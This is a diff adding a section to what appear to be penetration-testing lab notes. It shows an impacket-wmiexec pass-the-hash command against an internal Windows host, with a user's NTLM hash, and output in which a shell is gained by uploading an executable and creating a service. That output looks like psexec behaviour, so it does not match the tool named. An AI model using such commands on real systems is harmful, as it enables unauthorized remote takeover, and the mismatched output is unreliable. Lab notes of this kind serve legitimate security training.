@@ -111,3 +111,23 @@ corp\jen
 FILES04
 ```
 
+
+
+## Impacket WMIExec
+
+```shell-session
+kali@kali$ proxychains -q impacket-wmiexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.6.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file CGOrpfCz.exe
+[*] Opening SVCManager on 172.16.6.240.....
+[*] Creating service tahE on 172.16.6.240.....
+[*] Starting service tahE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+\
